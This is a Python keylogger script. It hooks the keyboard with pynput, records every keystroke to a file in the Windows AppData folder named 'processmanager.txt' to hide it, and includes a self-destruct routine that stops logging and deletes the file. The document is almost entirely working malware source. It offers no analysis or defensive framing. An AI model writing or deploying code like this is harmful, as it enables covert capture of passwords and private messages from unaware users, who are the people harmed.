import os
from pynput.keyboard import Listener
import time
import threading

class Keylogger():
    lastone = ''
    keys = []
    count = 0
    flag = 0
    path = os.environ['appdata'] + '\\processmanager.txt' # for windows env
    #path = 'processmanager.txt' # for linux env

    def on_press(self, key):
        self.keys.append(key)
        self.count += 1

        if self.count >= 1:
            self.count = 0
            self.write_file(self.keys)
            self.keys = []

    def write_file(self, keys):
        with open(self.path, 'a') as f:
            for key in keys:
                k = str(key).replace("'", "")
                if k.find('backspace') > 0:
                    f.write(' BackSpace ')
                elif k.find('enter') > 0:
                    f.write('\n')
                elif k.find('shift') > 0:
                    if k != self.lastone:
                        f.write(' Shift ')
                elif k.find('space') > 0:
                    f.write(' ')
                elif k.find('caps_lock') > 0:
                    f.write(' caps_lock ')
                elif k.find('Key'):
                    f.write(k)
                self.lastone = k

    def read_logs(self):
        with open(self.path, 'rt') as f:
            return f.read()

    def self_destruct(self):
        self.flag = 1
        listener.stop()
        os.remove(self.path)

    def start(self):
        global listener
        with Listener(on_press=self.on_press) as listener:
            listener.join()


if __name__ == '__main__':
    kl = Keylogger()
    t = threading.Thread(target=kl.start)
    t.start()
    while kl.flag != 1:
        time.sleep(10)
        logs = kl.read_logs()
        print(logs)
    kl.self_destruct()
    t.join()

